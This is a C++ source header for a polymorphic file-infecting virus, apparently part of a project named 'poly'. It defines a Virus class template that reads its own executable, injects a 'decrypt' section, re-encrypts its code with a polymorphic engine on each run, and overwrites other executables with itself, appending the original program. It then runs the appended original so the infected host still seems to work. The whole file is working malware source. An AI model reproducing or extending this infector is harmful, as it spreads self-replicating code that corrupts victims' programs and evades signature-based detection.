#pragma once

#include <cstdio>

#include <algorithm>
#include <array>
#include <fstream>
#include <memory>
#include <string>
#include <system_error>
#include <vector>

#include "poly/binary_editor.hpp"
#include "poly/engine.hpp"
#include "poly/enums.hpp"
#include "poly/filesystem.hpp"
#include "poly/host_properties.hpp"
#include "poly/utils.hpp"
#include "poly/virus.hpp"

namespace poly {

    template <>
    EncryptionSecret<kByteWordSize>
    RandomGenerator::get_random<EncryptionSecret<kByteWordSize>>() noexcept {
        std::uniform_int_distribution<Block<kByteWordSize>> distribution{};
        return {distribution(generator_), distribution(generator_)};
    }

    template <>
    fs::path RandomGenerator::get_random<fs::path>() noexcept {
        constexpr auto alphanum = impl::make_array<char>(
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C',
            'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
            'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c',
            'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p',
            'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z');

        std::error_code err;
        auto temp_dir = fs::temp_directory_path(err);
        std::uniform_int_distribution<int> distribution{0, alphanum.size() - 1};
        std::string unique_rand_name;

        bool exists = true;
        while (exists) {
            unique_rand_name = "";
            for (auto i = 0; i < 16; i++) {
                unique_rand_name += alphanum[distribution(generator_)];
            }

            exists = fs::exists(temp_dir / unique_rand_name, err);
        }

        return temp_dir /= unique_rand_name;
    }

    template <class TargetSelectPolicy, class ExecPolicy, class Cipher,
              class Editor, class Compiler>
    const std::string Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor,
                            Compiler>::kNewSectionName = "decrypt";

    template <class TargetSelectPolicy, class ExecPolicy, class Cipher,
              class Editor, class Compiler>
    const std::string Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor,
                            Compiler>::kExecutableFileExtension =
        kOS == HostOS::kWindows ? ".exe" : "";

    template <class TargetSelectPolicy, class ExecPolicy, class Cipher,
              class Editor, class Compiler>
    std::unique_ptr<
        Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor, Compiler>>
    Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor, Compiler>::build(
        int argc, char **argv, char **envp) noexcept {
        if (argc <= 0 || argv == nullptr || envp == nullptr) {
            return nullptr;
        }

        std::ifstream input_file{argv[0], std::ios::in | std::ios::binary};

        if (!input_file) {
            return nullptr;
        }

        std::error_code err;
        std::size_t total_size = fs::file_size(argv[0], err);
        if (err) {
            return nullptr;
        }

        auto editor = BinaryEditor<Editor>::build(input_file, total_size);

        if (editor == nullptr) {
            return nullptr;
        }

        Address tmp;
        Address real_entry_va;
        std::size_t attached_file_size;
        if (editor->calculate_va(kNewSectionName, tmp) ==
            Error::kSectionNotFound) {
            editor->inject_section(kNewSectionName, {});
            real_entry_va = editor->first_execution_va();
            attached_file_size = 0;
        } else {
            input_file.seekg(total_size - sizeof(std::uint64_t) -
                             sizeof(Address));
            input_file.read(reinterpret_cast<char *>(&real_entry_va),
                            sizeof(Address));
            input_file.read(reinterpret_cast<char *>(&attached_file_size),
                            sizeof(std::uint64_t));
            editor->exec_first(real_entry_va);
        }

        input_file.close();

        return std::unique_ptr<
            Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor, Compiler>>{
            new Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor, Compiler>{
                argc, argv, envp, attached_file_size, total_size,
                std::move(editor), real_entry_va}};
    }

    template <class TargetSelectPolicy, class ExecPolicy, class Cipher,
              class Editor, class Compiler>
    Error Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor,
                Compiler>::infect_next(fs::path target) noexcept {
        std::error_code err;
        if (target.empty() || !fs::exists(target, err)) {
            target = this->next_target(this->argv_[0]);
        }

        std::size_t target_size = fs::file_size(target, err);
        if (err) {
            return Error::kFileAccessDenied;
        }

        this->modify_binary();

        auto temp_file =
            RandomGenerator::get_generator().get_random<fs::path>();

        if (!fs::copy_file(target, temp_file,
                           fs::copy_options::overwrite_existing, err)) {
            return Error::kFileCopyFailed;
        }

        if (!this->write_modified_target(temp_file, target_size)) {
            fs::remove(temp_file, err);
            return Error::kFileWritingFailed;
        }

        if (!fs::copy_file(temp_file, target,
                           fs::copy_options::overwrite_existing, err)) {
            fs::remove(temp_file, err);
            return Error::kFileCopyFailed;
        }

        fs::remove(temp_file, err);
        return Error::kNone;
    }

    template <class TargetSelectPolicy, class ExecPolicy, class Cipher,
              class Editor, class Compiler>
    Error Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor,
                Compiler>::exec_attached_program() noexcept {
        if (this->is_first_execution()) {
            return Error::kNoTargetAttached;
        }

        if (!this->target_temp_path_.empty()) {
            return Error::kTargetAlreadyInExecution;
        }

        auto temp_file =
            RandomGenerator::get_generator().get_random<fs::path>() +=
            this->kExecutableFileExtension;
        std::error_code err;
        if (!fs::copy_file(this->argv_[0], temp_file,
                           fs::copy_options::overwrite_existing, err)) {
            return Error::kFileCopyFailed;
        }

        if (!this->write_modified_target(temp_file, this->attached_file_size_,
                                         true)) {
            fs::remove(temp_file, err);
            return Error::kFileWritingFailed;
        }

        this->target_temp_path_ = temp_file;
        this->exec(temp_file, this->argc_, this->argv_, this->envp_);
        return Error::kNone;
    }

    template <class TargetSelectPolicy, class ExecPolicy, class Cipher,
              class Editor, class Compiler>
    Error Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor,
                Compiler>::wait_exec_end() noexcept {
        if (this->is_first_execution()) {
            return Error::kNoTargetAttached;
        }

        if (this->target_temp_path_.empty()) {
            return Error::kTargetNotExecuted;
        }

        this->wait();
        std::error_code err;
        fs::remove(this->target_temp_path_, err);
        this->target_temp_path_.clear();

        return Error::kNone;
    }

    template <class TargetSelectPolicy, class ExecPolicy, class Cipher,
              class Editor, class Compiler>
    Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor, Compiler>::Virus(
        int argc, char **argv, char **envp, std::size_t attached_file_size,
        std::size_t total_size, std::unique_ptr<BinaryEditor<Editor>> &&editor,
        Address real_entry_va) noexcept
        : argc_{argc}, argv_{argv}, envp_{envp},
          attached_file_size_{attached_file_size},
          total_size_{total_size}, editor_{std::move(editor)},
          real_entry_va_{real_entry_va}, target_temp_path_{} {}

    template <class TargetSelectPolicy, class ExecPolicy, class Cipher,
              class Editor, class Compiler>
    void Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor,
               Compiler>::modify_binary() noexcept {
        PolymorphicEngine<Cipher, Compiler, Editor> engine{*this->editor_};
        auto secret = RandomGenerator::get_generator()
                          .get_random<EncryptionSecret<kByteWordSize>>();
        engine.generate_code(secret);
        engine.encrypt_code(secret);

        poly::Address code_va = 0;
        this->editor_->calculate_va(kNewSectionName, code_va);

        this->editor_->update_content(
            kNewSectionName, engine.produce_raw(code_va, this->real_entry_va_));
        this->editor_->exec_first(code_va);
    }

    template <class TargetSelectPolicy, class ExecPolicy, class Cipher,
              class Editor, class Compiler>
    bool Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor,
               Compiler>::write_modified_target(const fs::path &target,
                                                std::size_t target_size,
                                                bool only_attached) noexcept {
        std::fstream out{target.string(),
                         std::ios::in | std::ios::out | std::ios::binary};
        if (!out.is_open()) {
            return false;
        }

        std::vector<std::uint8_t> target_content(target_size, 0);

        if (only_attached) {
            out.seekg(this->total_size_ - target_size - sizeof(std::uint64_t) -
                      sizeof(Address));
            out.read(reinterpret_cast<char *>(target_content.data()),
                     target_size);
        } else {
            out.read(reinterpret_cast<char *>(target_content.data()),
                     target_size);
        }

        out.seekg(0);

        if (only_attached) {
            out.write(reinterpret_cast<char *>(target_content.data()),
                      target_size);
        } else {
            if (this->editor_->save_changes(out) &&
                !this->is_first_execution()) {
                auto offset = static_cast<std::size_t>(out.tellg()) -
                              sizeof(std::uint64_t) - sizeof(Address) -
                              this->attached_file_size_;
                out.seekg(offset);
            }

            out.write(reinterpret_cast<char *>(target_content.data()),
                      target_size);

            out.write(reinterpret_cast<char *>(&this->real_entry_va_),
                      sizeof(Address));
            out.write(reinterpret_cast<char *>(&target_size),
                      sizeof(std::uint64_t));
        }

        out.close();
        return true;
    }

} // namespace poly